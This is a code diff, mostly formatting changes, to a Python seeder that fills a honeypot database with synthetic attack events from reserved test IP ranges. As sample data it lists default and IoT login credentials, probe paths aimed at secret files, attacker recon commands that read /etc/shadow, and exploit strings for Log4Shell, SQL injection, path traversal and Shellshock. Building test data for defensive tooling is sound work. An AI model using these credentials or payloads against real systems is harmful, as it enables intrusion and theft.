@@ -27,45 +27,117 @@ import ipaddress
 import random
 import sys
 import uuid
-from typing import Any, Iterator, Optional
+from typing import Any
 
 from pipeline.enrichment import enrich_event
 from storage.db import init_db, session_scope
-from storage.models import Event, EventType, Service, Session, Severity, utcnow
+from storage.models import Event, EventType, Session, Severity, utcnow
 
 # Reserved, non-routable ranges. See the module docstring.
 SOURCE_POOLS = [
-    ipaddress.ip_network("192.0.2.0/24"),      # RFC 5737 TEST-NET-1
-    ipaddress.ip_network("198.51.100.0/24"),   # RFC 5737 TEST-NET-2
-    ipaddress.ip_network("203.0.113.0/24"),    # RFC 5737 TEST-NET-3
-    ipaddress.ip_network("198.18.0.0/16"),     # RFC 2544 benchmarking
+    ipaddress.ip_network("192.0.2.0/24"),  # RFC 5737 TEST-NET-1
+    ipaddress.ip_network("198.51.100.0/24"),  # RFC 5737 TEST-NET-2
+    ipaddress.ip_network("203.0.113.0/24"),  # RFC 5737 TEST-NET-3
+    ipaddress.ip_network("198.18.0.0/16"),  # RFC 2544 benchmarking
 ]
 
 USERNAMES = [
-    "root", "admin", "administrator", "user", "test", "ubuntu", "oracle", "postgres",
-    "mysql", "ftp", "guest", "support", "pi", "deploy", "git", "jenkins", "www-data",
-    "backup", "operator", "service", "dev", "webmaster", "nagios", "zabbix", "elastic",
+    "root",
+    "admin",
+    "administrator",
+    "user",
+    "test",
+    "ubuntu",
+    "oracle",
+    "postgres",
+    "mysql",
+    "ftp",
+    "guest",
+    "support",
+    "pi",
+    "deploy",
+    "git",
+    "jenkins",
+    "www-data",
+    "backup",
+    "operator",
+    "service",
+    "dev",
+    "webmaster",
+    "nagios",
+    "zabbix",
+    "elastic",
 ]
 
 PASSWORDS = [
-    "123456", "password", "admin", "root", "12345678", "qwerty", "1234", "123456789",
-    "letmein", "welcome", "changeme", "P@ssw0rd", "admin123", "toor", "pass", "test",
-    "1qaz2wsx", "raspberry", "ubnt", "default", "system", "abc123", "master", "111111",
+    "123456",
+    "password",
+    "admin",
+    "root",
+    "12345678",
+    "qwerty",
+    "1234",
+    "123456789",
+    "letmein",
+    "welcome",
+    "changeme",
+    "P@ssw0rd",
+    "admin123",
+    "toor",
+    "pass",
+    "test",
+    "1qaz2wsx",
+    "raspberry",
+    "ubnt",
+    "default",
+    "system",
+    "abc123",
+    "master",
+    "111111",
 ]
 
 IOT_CREDS = [
-    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), ("admin", "admin"),
-    ("root", "888888"), ("root", "xmhdipc"), ("support", "support"), ("root", "juantech"),
+    ("root", "xc3511"),
+    ("root", "vizxv"),
+    ("root", "admin"),
+    ("admin", "admin"),
+    ("root", "888888"),
+    ("root", "xmhdipc"),
+    ("support", "support"),
+    ("root", "juantech"),
 ]
 
 SCAN_PATHS = [
-    "/", "/admin", "/admin/login.php", "/wp-login.php", "/wp-admin/", "/phpmyadmin/",
-    "/.env", "/.git/config", "/config.php", "/backup.sql", "/server-status",
-    "/api/v1/users", "/actuator/env", "/solr/admin/cores", "/cgi-bin/test.cgi",
-    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/shell.php", "/xmlrpc.php",
-    "/manager/html", "/console", "/jenkins/script", "/.aws/credentials", "/robots.txt",
-    "/index.php?s=/Index/\\think\\app/invokefunction", "/boaform/admin/formLogin",
-    "/HNAP1/", "/setup.cgi", "/dns-query", "/owa/auth/logon.aspx", "/telescope/requests",
+    "/",
+    "/admin",
+    "/admin/login.php",
+    "/wp-login.php",
+    "/wp-admin/",
+    "/phpmyadmin/",
+    "/.env",
+    "/.git/config",
+    "/config.php",
+    "/backup.sql",
+    "/server-status",
+    "/api/v1/users",
+    "/actuator/env",
+    "/solr/admin/cores",
+    "/cgi-bin/test.cgi",
+    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/shell.php",
+    "/xmlrpc.php",
+    "/manager/html",
+    "/console",
+    "/jenkins/script",
+    "/.aws/credentials",
+    "/robots.txt",
+    "/index.php?s=/Index/\\think\\app/invokefunction",
+    "/boaform/admin/formLogin",
+    "/HNAP1/",
+    "/setup.cgi",
+    "/dns-query",
+    "/owa/auth/logon.aspx",
+    "/telescope/requests",
 ]
 
 USER_AGENTS = [
@@ -102,9 +174,17 @@ SHELL_SEQUENCES = {
         "crontab -l",
     ],
     "recon": [
-        "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /root",
-        "cat /root/.ssh/authorized_keys", "netstat -antp", "ps aux", "df -h",
-        "cat /etc/shadow", "history",
+        "whoami",
+        "id",
+        "uname -a",
+        "cat /etc/passwd",
+        "ls -la /root",
+        "cat /root/.ssh/authorized_keys",
+        "netstat -antp",
+        "ps aux",
+        "df -h",
+        "cat /etc/shadow",
+        "history",
     ],
     "persistence": [
         "id",
@@ -117,10 +197,25 @@ SHELL_SEQUENCES = {
 }
 
 EXPLOIT_PAYLOADS = [
-    ("/", "${jndi:ldap://198.18.0.44:1389/Basic/Command/Base64/d2hvYW1p}", ["log4shell"], Severity.CRITICAL),
-    ("/index.php?id=1' UNION SELECT username,password FROM users--", None, ["sql-injection"], Severity.HIGH),
+    (
+        "/",
+        "${jndi:ldap://198.18.0.44:1389/Basic/Command/Base64/d2hvYW1p}",
+        ["log4shell"],
+        Severity.CRITICAL,
+    ),
+    (
+        "/index.php?id=1' UNION SELECT username,password FROM users--",
+        None,
+        ["sql-injection"],
+        Severity.HIGH,
+    ),
     ("/../../../../etc/passwd", None, ["path-traversal"], Severity.HIGH),
-    ("/cgi-bin/test.cgi", "() { :; }; /bin/bash -c 'id'", ["shellshock", "cgi-probe"], Severity.CRITICAL),
+    (
+        "/cgi-bin/test.cgi",
+        "() { :; }; /bin/bash -c 'id'",
+        ["shellshock", "cgi-probe"],
+        Severity.CRITICAL,
+    ),
     ("/upload/shell.php", None, ["webshell-upload"], Severity.CRITICAL),
     ("/.env", None, ["env-file-probe"], Severity.HIGH),
 ]
@@ -146,7 +241,7 @@ class Seeder:
         offset = self.rng.randrange(1, min(size - 1, 65534))
         return str(network.network_address + offset)
 
-    def random_time(self, bias_hours: Optional[int] = None) -> dt.datetime:
+    def random_time(self, bias_hours: int | None = None) -> dt.datetime:
         """A timestamp in the window.
 
         ``bias_hours`` concentrates a campaign around a UTC hour, which is what
@@ -159,9 +254,7 @@ class Seeder:
             ts = ts.replace(hour=(bias_hours + self.rng.randint(-2, 2)) % 24)
         return ts
 
-    def new_session(
-        self, src_ip: str, service: str, started: dt.datetime, dst_port: int
-    ) -> str:
+    def new_session(self, src_ip: str, service: str, started: dt.datetime, dst_port: int) -> str:
         session_id = str(uuid.uuid4())
         self.sessions.append(
             {
@@ -338,21 +431,27 @@ class Seeder:
             offset += self.rng.uniform(1, 4)
             self.add_event(
                 ts=started + dt.timedelta(seconds=offset),
-                session_id=session_id, service="ssh",
+                session_id=session_id,
+                service="ssh",
                 event_type=EventType.AUTH_ATTEMPT.value,
                 severity=Severity.MEDIUM.value,
-                src_ip=src_ip, dst_port=22,
-                username=username, password=self.rng.choice(PASSWORDS),
+                src_ip=src_ip,
+                dst_port=22,
+                username=username,
+                password=self.rng.choice(PASSWORDS),
                 tags=["ssh-password"],
             )
 
         offset += 2
         self.add_event(
             ts=started + dt.timedelta(seconds=offset),
-            session_id=session_id, service="ssh",
+            session_id=session_id,
+            service="ssh",
             event_type=EventType.AUTH_SUCCESS.value,
             severity=Severity.HIGH.value,
-            src_ip=src_ip, dst_port=22, username=username,
+            src_ip=src_ip,
+            dst_port=22,
+            username=username,
             tags=["shell-granted"],
         )
 
@@ -365,11 +464,15 @@ class Seeder:
                 tags = ["payload-fetch", "second-stage-url"]
             self.add_event(
                 ts=started + dt.timedelta(seconds=offset),
-                session_id=session_id, service="ssh",
+                session_id=session_id,
+                service="ssh",
                 event_type=EventType.COMMAND.value,
                 severity=Severity.CRITICAL.value if tags else Severity.HIGH.value,
-                src_ip=src_ip, dst_port=22, username=username,
-                command=command, tags=tags,
+                src_ip=src_ip,
+                dst_port=22,
+                username=username,
+                command=command,
+                tags=tags,
             )
 
     def ftp_probe(self, src_ip: str) -> None:
@@ -380,11 +483,14 @@ class Seeder:
         ):
             self.add_event(
                 ts=started + dt.timedelta(seconds=i * 2),
-                session_id=session_id, service="ftp",
+                session_id=session_id,
+                service="ftp",
                 event_type=EventType.AUTH_ATTEMPT.value,
                 severity=Severity.MEDIUM.value,
-                src_ip=src_ip, dst_port=21,
-                username=username, password=password,
+                src_ip=src_ip,
+                dst_port=21,
+                username=username,
+                password=password,
                 tags=["ftp-anonymous" if username in ("anonymous", "ftp") else "ftp-user"],
             )
 
@@ -397,10 +503,12 @@ class Seeder:
         for i in range(self.rng.randint(1, 3)):
             self.add_event(
                 ts=started + dt.timedelta(seconds=i),
-                session_id=session_id, service=service,
+                session_id=session_id,
+                service=service,
                 event_type=EventType.CONNECT.value,
                 severity=Severity.INFO.value,
-                src_ip=src_ip, dst_port=port,
+                src_ip=src_ip,
+                dst_port=port,
                 tags=[],
             )
 
@@ -461,7 +569,7 @@ class Seeder:
             session["asn"] = events[0].get("asn")
 
 
-def main(argv: Optional[list[str]] = None) -> int:
+def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(description="Seed synthetic honeypot data")
     parser.add_argument("--attackers", type=int, default=150, help="distinct source IPs")
     parser.add_argument("--days", type=float, default=14.0, help="how far back to spread events")
